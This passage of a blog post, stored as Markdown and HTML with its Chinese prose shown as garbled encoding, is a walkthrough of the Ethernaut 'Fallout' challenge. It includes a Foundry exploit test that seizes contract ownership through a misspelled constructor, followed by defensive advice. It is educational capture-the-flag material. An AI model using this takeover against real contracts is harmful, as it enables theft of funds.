‡åˆçº¦\n        instance = new Fallout();\n        \n        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘\n        vm.deal(attacker, 1 ether);\n    }\n\n    function testFalloutExploit() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"Original owner:\", instance.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        // æ”»å‡»æ­¥éª¤ï¼šç›´æ¥è°ƒç”¨é”™è¯¯å‘½åçš„\"æ„é€ å‡½æ•°\"\n        instance.Fal1out{value: 0.001 ether}();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.owner(), attacker);\n        console.log(\"New owner:\", instance.owner());\n        \n        vm.stopPrank();\n    }\n    \n    function testOriginalOwnerIsZero() public view {\n        // éªŒè¯åˆçº¦éƒ¨ç½²åæ²¡æœ‰ownerï¼ˆå› ä¸ºæ„é€ å‡½æ•°æœªæ‰§è¡Œï¼‰\n        assertEq(instance.owner(), address(0));\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Fallout å…³å¡æµ‹è¯•\nforge test --match-contract FalloutTest -vvv\n\n# é¢„æœŸè¾“å‡ºï¼š\n# [PASS] testFalloutExploit()\n# [PASS] testOriginalOwnerIsZero()\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### ç°ä»£ Solidity è§£å†³æ–¹æ¡ˆ\n\nä» **Solidity 0.4.22** å¼€å§‹ï¼Œå¼•å…¥äº† `constructor` å…³é”®å­—ï¼š\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SecureFallout {\n    address public owner;\n    mapping (address => uint) allocations;\n    \n    // âœ… ä½¿ç”¨ constructor å…³é”®å­—\n    constructor() {\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    // å…¶ä»–å‡½æ•°...\n}\n```\n\n### å®‰å…¨æœ€ä½³å®è·µ\n\n1. **ä½¿ç”¨ç°ä»£è¯­æ³•**\n```solidity\n// âŒ æ—§ç‰ˆæœ¬ï¼ˆå®¹æ˜“å‡ºé”™ï¼‰\nfunction ContractName() public {\n    // æ„é€ é€»è¾‘\n}\n\n// âœ… æ–°ç‰ˆæœ¬ï¼ˆæ˜ç¡®ä¸”å®‰å…¨ï¼‰\nconstructor() {\n    // æ„é€ é€»è¾‘\n}\n```\n\n2. **ä»£ç å®¡è®¡æ£€æŸ¥æ¸…å•**\n```solidity\n// æ£€æŸ¥é¡¹ç›®ï¼š\n// âœ… æ„é€ å‡½æ•°åç§°ä¸åˆçº¦åç§°æ˜¯å¦å®Œå…¨åŒ¹é…\n// âœ… æ˜¯å¦ä½¿ç”¨äº†ç°ä»£ constructor è¯­æ³•\n// âœ… æ˜¯å¦æœ‰å¤šä¸ªç±»ä¼¼æ„é€ å‡½æ•°çš„å‡½æ•°\n// âœ… æƒé™åˆå§‹åŒ–æ˜¯å¦æ­£ç¡®æ‰§è¡Œ\n```\n\n3. **ç¼–è¯‘å™¨è­¦å‘Š**\n```bash\n# ç°ä»£ç¼–è¯‘å™¨ä¼šå¯¹å¯ç–‘çš„å‡½æ•°åå‘å‡ºè­¦å‘Š\nWarning: Function state mutability can be restricted to pure\nWarning: This function has the same name as the contract\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. Solidity ç‰ˆæœ¬æ¼”è¿›\n\n| ç‰ˆæœ¬ | æ„é€ å‡½æ•°è¯­æ³• | å®‰å…¨æ€§ |\n|------|------------|--------|\n| < 0.4.22 | `function ContractName()` | âŒ å®¹æ˜“æ‹¼å†™é”™è¯¯ |\n| >= 0.4.22 | `constructor()` | âœ… æ˜ç¡®ä¸”å®‰å…¨ |\n\n### 2. å¸¸è§å‘½åé”™è¯¯\n\n```solidity\ncontract MyContract {\n    // âŒ å¸¸è§é”™è¯¯ç±»å‹\n    function MyContracr() public { }  // æ‹¼å†™é”™è¯¯\n    function myContract() public { }  // å¤§å°å†™é”™è¯¯\n    function MyContract_() public { } // å¤šä½™å­—ç¬¦\n    function MyContract() public { }  // å¯èƒ½æ­£ç¡®ï¼Œä½†ä¸æ¨è\n}\n```\n\n### 3. ä»£ç å®¡è®¡é‡ç‚¹\n\n- **å­—ç¬¦ç›¸ä¼¼æ€§æ£€æŸ¥** - 1 vs l, 0 vs O\n- **å¤§å°å†™æ•æ„Ÿæ€§** - Solidity åŒºåˆ†å¤§å°å†™\n- **é¢å¤–å­—ç¬¦æ£€æŸ¥** - ä¸‹åˆ’çº¿ã€ç©ºæ ¼ç­‰\n- **ç¼–ç é—®é¢˜** - Unicode å­—ç¬¦æ··ç”¨\n\n## ğŸ” å®é™…æ¡ˆä¾‹åˆ†æ\n\n### å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\n\n1. **Rubixi æ™ºèƒ½åˆçº¦** (2016)\n   - åˆçº¦ä» `DynamicPyramid` é‡å‘½åä¸º `Rubixi`\n   - å¿˜è®°æ›´æ–°æ„é€ å‡½æ•°åç§°\n   - å¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥æˆä¸º owner\n\n2. **å…¶ä»–ç±»ä¼¼æ¡ˆä¾‹**\n   - å¤åˆ¶ç²˜è´´ä»£ç æ—¶å¿˜è®°ä¿®æ”¹å‡½æ•°å\n   - å›¢é˜Ÿåä½œä¸­çš„æ²Ÿé€šå¤±è¯¯\n   - è‡ªåŠ¨åŒ–é‡æ„å·¥å…·çš„ç¼ºé™·\n\n### æ¼æ´å½±å“è¯„ä¼°\n\n- **ç›´æ¥å½±å“**: å®Œå…¨ä¸§å¤±åˆçº¦æ§åˆ¶æƒ\n- **èµ„é‡‘é£é™©**: åˆçº¦ä¸­çš„æ‰€æœ‰èµ„é‡‘\n- **ä¿®å¤éš¾åº¦**: æ— æ³•ä¿®å¤ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²\n- **æ£€æµ‹éš¾åº¦**: æä½ï¼Œä½†å®¹æ˜“è¢«å¿½è§†\n\n## ğŸ¯ æ€»ç»“\n\nFallout å…³å¡å±•ç¤ºäº†ä¸€ä¸ªçœ‹ä¼¼å¾®ä¸è¶³é“ä½†åæœä¸¥é‡çš„æ¼æ´ï¼š\n\n- âœ… **ç»†èŠ‚å†³å®šæˆè´¥** - ä¸€ä¸ªå­—ç¬¦çš„å·®å¼‚å¯¼è‡´å®Œå…¨ä¸åŒçš„ç»“æœ\n- âœ… **å·¥å…·çš„é‡è¦æ€§** - ç°ä»£ç¼–è¯‘å™¨å’Œå·¥å…·å¯ä»¥é¿å…æ­¤ç±»é”™è¯¯\n- âœ… **ä»£ç å®¡è®¡çš„ä»·å€¼** - äººå·¥å®¡è®¡èƒ½å‘ç°å·¥å…·é—æ¼çš„é—®é¢˜\n- âœ… **ç‰ˆæœ¬å‡çº§çš„å¿…è¦æ€§** - ä½¿ç”¨æœ€æ–°çš„å®‰å…¨ç‰¹æ€§\n\nè¿™ä¸ªæ¡ˆä¾‹æé†’æˆ‘ä»¬ï¼Œåœ¨æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œ**æ²¡æœ‰å°é”™è¯¯ï¼Œåªæœ‰å¤§æŸå¤±**ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[ä¸‹ä¸€å…³: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*é­”é¬¼è—åœ¨ç»†èŠ‚ä¸­ï¼Œå®‰å…¨å§‹äºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚* ğŸ”","slug":"ethernaut-level-02-fallout","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zboy0009bf5q0im60usu","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-2-Fallout-æ„é€ å‡½æ•°å‘½åæ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-2-Fallout-æ„é€ å‡½æ•°å‘½åæ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´\"></a>ğŸ¯ Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/2\">Ethernaut Level 2 - Fallout</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ„é€ å‡½æ•°å‘½åé”™è¯¯ã€å†å²æ¼æ´<br><strong>éš¾åº¦</strong>: â­â˜†â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™ä¸ªå…³å¡è€ƒæŸ¥çš„æ˜¯å¼€å‘è€…åœ¨ä»£ç ç¼–å†™ä¸­çš„ç»†å¿ƒç¨‹åº¦ï¼š</p>\n<ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸ºåˆçº¦çš„ <code>owner</code></li>\n<li><strong>ç†è§£å†å²æ¼æ´</strong> - å­¦ä¹  Solidity æ—©æœŸç‰ˆæœ¬çš„å®‰å…¨é—®é¢˜</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    address payable public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // ğŸš¨ æ³¨æ„è¿™é‡Œçš„æ‹¼å†™ï¼</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocate() public payable &#123;</span><br><span class=\"line\">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function sendAllocation(address payable allocator) public &#123;</span><br><span class=\"line\">        require(allocations[allocator] &gt; 0);</span><br><span class=\"line\">        allocator.transfer(allocations[allocator]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function collectAllocations() public onlyOwner &#123;</span><br><span class=\"line\">        msg.sender.transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class=\"line\">        return allocations[allocator];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p>ä»”ç»†è§‚å¯Ÿåˆçº¦ä»£ç ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ª<strong>æå…¶å¾®å¦™ä½†è‡´å‘½çš„é”™è¯¯</strong>ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// åˆçº¦åç§°</span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // âŒ è¿™é‡Œæ˜¯ &quot;Fal1out&quot; (æ•°å­—1)</span><br><span class=\"line\">        owner = msg.sender;             // è€Œä¸æ˜¯ &quot;Fallout&quot; (å­—æ¯l)</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å†å²èƒŒæ™¯\"><a href=\"#å†å²èƒŒæ™¯\" class=\"headerlink\" title=\"å†å²èƒŒæ™¯\"></a>å†å²èƒŒæ™¯</h3><p>åœ¨ <strong>Solidity 0.4.22</strong> ä¹‹å‰ï¼Œæ„é€ å‡½æ•°çš„å®šä¹‰æ–¹å¼æ˜¯ï¼š</p>\n<ul>\n<li>åˆ›å»ºä¸€ä¸ªä¸åˆçº¦åç§°<strong>å®Œå…¨ç›¸åŒ</strong>çš„å‡½æ•°</li>\n<li>è¯¥å‡½æ•°ä¼šåœ¨åˆçº¦éƒ¨ç½²æ—¶è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡</li>\n</ul>\n<p>ä½†åœ¨è¿™ä¸ªåˆçº¦ä¸­ï¼š</p>\n<ul>\n<li>åˆçº¦åç§°æ˜¯ <code>Fallout</code>ï¼ˆå­—æ¯ lï¼‰</li>\n<li>å‡½æ•°åç§°æ˜¯ <code>Fal1out</code>ï¼ˆæ•°å­— 1ï¼‰</li>\n</ul>\n<p><strong>ç»“æœ</strong>: è¿™ä¸ªå‡½æ•°ä¸æ˜¯æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>æ™®é€šçš„å…¬å¼€å‡½æ•°</strong>ï¼</p>\n<h3 id=\"æ”»å‡»è·¯å¾„\"><a href=\"#æ”»å‡»è·¯å¾„\" class=\"headerlink\" title=\"æ”»å‡»è·¯å¾„\"></a>æ”»å‡»è·¯å¾„</h3><ol>\n<li><strong>è¯†åˆ«ä¼ªè£…çš„æ„é€ å‡½æ•°</strong> - å‘ç° <code>Fal1out()</code> å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨</li>\n<li><strong>ç›´æ¥è°ƒç”¨å‡½æ•°</strong> - è°ƒç”¨ <code>Fal1out()</code> æˆä¸º <code>owner</code></li>\n<li><strong>éªŒè¯æƒé™è·å–</strong> - ç¡®è®¤å·²è·å¾—åˆçº¦æ§åˆ¶æƒ</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallout.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FalloutTest is Test &#123;</span><br><span class=\"line\">    Fallout public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        instance = new Fallout();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFalloutExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Original owner:&quot;, instance.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»æ­¥éª¤ï¼šç›´æ¥è°ƒç”¨é”™è¯¯å‘½åçš„&quot;æ„é€ å‡½æ•°&quot;</span><br><span class=\"line\">        instance.Fal1out&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, instance.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testOriginalOwnerIsZero() public view &#123;</span><br><span class=\"line\">        // éªŒè¯åˆçº¦éƒ¨ç½²åæ²¡æœ‰ownerï¼ˆå› ä¸ºæ„é€ å‡½æ•°æœªæ‰§è¡Œï¼‰</span><br><span class=\"line\">        assertEq(instance.owner(), address(0));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Fallout å…³å¡æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FalloutTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é¢„æœŸè¾“å‡ºï¼š</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testFalloutExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testOriginalOwnerIsZero()</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"ç°ä»£-Solidity-è§£å†³æ–¹æ¡ˆ\"><a href=\"#ç°ä»£-Solidity-è§£å†³æ–¹æ¡ˆ\" class=\"headerlink\" title=\"ç°ä»£ Solidity è§£å†³æ–¹æ¡ˆ\"></a>ç°ä»£ Solidity è§£å†³æ–¹æ¡ˆ</h3><p>ä» <strong>Solidity 0.4.22</strong> å¼€å§‹ï¼Œå¼•å…¥äº† <code>constructor</code> å…³é”®å­—ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureFallout &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // âœ… ä½¿ç”¨ constructor å…³é”®å­—</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // å…¶ä»–å‡½æ•°...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰å…¨æœ€ä½³å®è·µ\"><a href=\"#å®‰å…¨æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"å®‰å…¨æœ€ä½³å®è·µ\"></a>å®‰å…¨æœ€ä½³å®è·µ</h3><ol>\n<li><p><strong>ä½¿ç”¨ç°ä»£è¯­æ³•</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ æ—§ç‰ˆæœ¬ï¼ˆå®¹æ˜“å‡ºé”™ï¼‰</span><br><span class=\"line\">function ContractName() public &#123;</span><br><span class=\"line\">    // æ„é€ é€»è¾‘</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… æ–°ç‰ˆæœ¬ï¼ˆæ˜ç¡®ä¸”å®‰å…¨ï¼‰</span><br><span class=\"line\">constructor() &#123;</span><br><span class=\"line\">    // æ„é€ é€»è¾‘</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä»£ç å®¡è®¡æ£€æŸ¥æ¸…å•</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ£€æŸ¥é¡¹ç›®ï¼š</span><br><span class=\"line\">// âœ… æ„é€ å‡½æ•°åç§°ä¸åˆçº¦åç§°æ˜¯å¦å®Œå…¨åŒ¹é…</span><br><span class=\"line\">// âœ… æ˜¯å¦ä½¿ç”¨äº†ç°ä»£ constructor è¯­æ³•</span><br><span class=\"line\">// âœ… æ˜¯å¦æœ‰å¤šä¸ªç±»ä¼¼æ„é€ å‡½æ•°çš„å‡½æ•°</span><br><span class=\"line\">// âœ… æƒé™åˆå§‹åŒ–æ˜¯å¦æ­£ç¡®æ‰§è¡Œ</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ç¼–è¯‘å™¨è­¦å‘Š</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ç°ä»£ç¼–è¯‘å™¨ä¼šå¯¹å¯ç–‘çš„å‡½æ•°åå‘å‡ºè­¦å‘Š</span></span><br><span class=\"line\">Warning: Function state mutability can be restricted to pure</span><br><span class=\"line\">Warning: This <span class=\"keyword\">function</span> has the same name as the contract</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-Solidity-ç‰ˆæœ¬æ¼”è¿›\"><a href=\"#1-Solidity-ç‰ˆæœ¬æ¼”è¿›\" class=\"headerlink\" title=\"1. Solidity ç‰ˆæœ¬æ¼”è¿›\"></a>1. Solidity ç‰ˆæœ¬æ¼”è¿›</h3><table>\n<thead>\n<tr>\n<th>ç‰ˆæœ¬</th>\n<th>æ„é€ å‡½æ•°è¯­æ³•</th>\n<th>å®‰å…¨æ€§</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt; 0.4.22</td>\n<td><code>function ContractName()</code></td>\n<td>âŒ å®¹æ˜“æ‹¼å†™é”™è¯¯</td>\n</tr>\n<tr>\n<td>&gt;&#x3D; 0.4.22</td>\n<td><code>constructor()</code></td>\n<td>âœ… æ˜ç¡®ä¸”å®‰å…¨</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-å¸¸è§å‘½åé”™è¯¯\"><a href=\"#2-å¸¸è§å‘½åé”™è¯¯\" class=\"headerlink\" title=\"2. å¸¸è§å‘½åé”™è¯¯\"></a>2. å¸¸è§å‘½åé”™è¯¯</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MyContract &#123;</span><br><span class=\"line\">    // âŒ å¸¸è§é”™è¯¯ç±»å‹</span><br><span class=\"line\">    function MyContracr() public &#123; &#125;  // æ‹¼å†™é”™è¯¯</span><br><span class=\"line\">    function myContract() public &#123; &#125;  // å¤§å°å†™é”™è¯¯</span><br><span class=\"line\">    function MyContract_() public &#123; &#125; // å¤šä½™å­—ç¬¦</span><br><span class=\"line\">    function MyContract() public &#123; &#125;  // å¯èƒ½æ­£ç¡®ï¼Œä½†ä¸æ¨è</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä»£ç å®¡è®¡é‡ç‚¹\"><a href=\"#3-ä»£ç å®¡è®¡é‡ç‚¹\" class=\"headerlink\" title=\"3. ä»£ç å®¡è®¡é‡ç‚¹\"></a>3. ä»£ç å®¡è®¡é‡ç‚¹</h3><ul>\n<li><strong>å­—ç¬¦ç›¸ä¼¼æ€§æ£€æŸ¥</strong> - 1 vs l, 0 vs 